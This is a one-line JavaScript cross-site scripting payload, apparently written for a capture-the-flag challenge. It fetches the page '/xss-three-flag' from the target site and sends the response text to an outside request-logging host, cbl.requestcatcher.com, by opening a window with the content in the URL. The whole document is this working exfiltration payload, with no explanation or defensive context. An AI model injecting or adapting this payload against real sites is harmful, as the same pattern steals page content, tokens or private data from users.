fetch('/xss-three-flag').then(r=>r.text()).then(t=>window.open(['https://cbl.requestcatcher.com/test?c=',t].join('')));
